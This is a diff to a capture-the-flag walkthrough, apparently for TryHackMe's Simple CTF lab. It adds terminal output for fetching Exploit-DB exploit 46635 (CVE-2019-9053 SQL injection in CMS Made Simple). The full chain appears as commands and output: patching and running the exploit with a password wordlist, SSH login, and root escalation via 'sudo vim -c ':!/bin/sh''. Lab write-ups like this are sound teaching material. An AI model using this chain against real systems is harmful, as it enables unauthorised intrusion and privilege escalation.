@@ -109,10 +109,26 @@ CMS Made Simple < 2.2.10 - SQL Injection                               | https:/
 Shellcodes: No Results
 ```
 8. `wget https://www.exploit-db.com/raw/46635`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ wget https://www.exploit-db.com/raw/46635
+--2023-07-02 12:12:57--  https://www.exploit-db.com/raw/46635
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6456 (6.3K) [text/plain]
+Saving to: ‘46635.1’
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/CVE-2019-9053.png)
+46635.1                      100%[==============================================>]   6.30K  --.-KB/s    in 0s      
 
-9. `ls`
+2023-07-02 12:12:58 (40.4 MB/s) - ‘46635.1’ saved [6456/6456]
+```
+9. `cd Downloads`
+10. `ls`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cd Downloads
+```
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ ls
@@ -121,7 +137,7 @@ Shellcodes: No Results
 
 # Vulnerability Exploitation
 > Exploiting CVE-2019-9053
-10. `python 46635`
+11. `python 46635`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python 46635                                                       
@@ -130,7 +146,7 @@ Shellcodes: No Results
     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 ```
-11. `gedit python 46635` to open up the Python exploit and add parantheses for every print command that's missing one (Lines 25, 26, 27, 28, 63, 69, and 183) as well as change it from using the **python** interpreter () to the **python3** interpreter ()
+12. `gedit python 46635` to open up the Python exploit and add parantheses for every print command that's missing one (Lines 25, 26, 27, 28, 63, 69, and 183) as well as change it from using the **python** interpreter () to the **python3** interpreter ()
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ gedit 46635
@@ -138,7 +154,7 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py.png)
 
-12. `python 46635`
+13. `python 46635`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python 46635   
@@ -147,7 +163,7 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 [+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
 [+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
 ```
-13. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
+14. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python3 46635 -u http://10.10.130.66/simple --crack -w rockyou.txt
@@ -166,11 +182,11 @@ Traceback (most recent call last):
     (result, consumed) = self._buffer_decode(data, self.errors, final)
 UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invalid continuation byte
 ```
-14. `gedit 46635`
+15. `gedit 46635`
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py%20pt2.png)
 
-15. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
+16. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python3 46635 -u http://10.10.130.66/simple --crack -w rockyou.txt
@@ -184,7 +200,7 @@ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invali
 
 #
 > Step
-16. `ssh {USERNAME}@{TARGET IP} -p 2222`
+17. `ssh {USERNAME}@{TARGET IP} -p 2222`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ ssh mitch@10.10.130.66 -p 2222
@@ -201,10 +217,10 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
 Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
 $
 ```
-17. `whoami`
-18. `pwd`
-19. `ls`
-20. `cat {USER TEXT FILE}`
+18. `whoami`
+19. `pwd`
+20. `ls`
+21. `cat {USER TEXT FILE}`
 ```bash
 $ whoami
 mitch
@@ -224,24 +240,24 @@ G00d j0b, keep up!
 
 # Post Exploitation
 > Privilege Escalation
-21. `sudo -l`
+22. `sudo -l`
 ```bash
 $ sudo -l     
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
-22. `firefox "https://gtfobins.github.io/" and search for vim
+23. `firefox "https://gtfobins.github.io/" and search for vim
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/GTFOBins.png)
 
-23. `sudo vim -c ':!/bin/sh'`
+24. `sudo vim -c ':!/bin/sh'`
 ```bash
 $ sudo vim -c ':!/bin/sh'
 #
 ```
-24. `whoami`
-25. `ls /root`
-26. `cat {ROOT TEXT FILE}`
+25. `whoami`
+26. `ls /root`
+27. `cat {ROOT TEXT FILE}`
 ```bash
 # whoami
 root
@@ -267,24 +283,25 @@ W3ll d0n3. You made it!
 5. `firefox http://{TARGET IP}/simple`
 6. `searchsploit "CMS made simple 2.2.8" --www`
 7. `wget https://www.exploit-db.com/raw/46635`
-8. `ls`
-9. `python 46635`
-10. `gedit python 46635`
-11. `python 46635`
-12. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
-13. `gedit 46635`
-14. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
-15. `ssh {USERNAME}@{TARGET IP} -p 2222`
-16. `whoami`
-17. `pwd`
-18. `ls`
-19. `cat {FILE1}.txt`
-20. `sudo -l`
-21. `firefox "https://gtfobins.github.io/"`
-22. `sudo vim -c ':!/bin/sh'`
-23. `whoami`
-24. `ls /root`
-25. `cat {ROOT TEXT FILE}`
+8. `cd Downloads`
+9. `ls`
+10. `python 46635`
+11. `gedit python 46635`
+12. `python 46635`
+13. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
+14. `gedit 46635`
+15. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
+16. `ssh {USERNAME}@{TARGET IP} -p 2222`
+17. `whoami`
+18. `pwd`
+19. `ls`
+20. `cat {FILE1}.txt`
+21. `sudo -l`
+22. `firefox "https://gtfobins.github.io/"`
+23. `sudo vim -c ':!/bin/sh'`
+24. `whoami`
+25. `ls /root`
+26. `cat {ROOT TEXT FILE}`
 
 # Dissecting Some Commands
 > Step
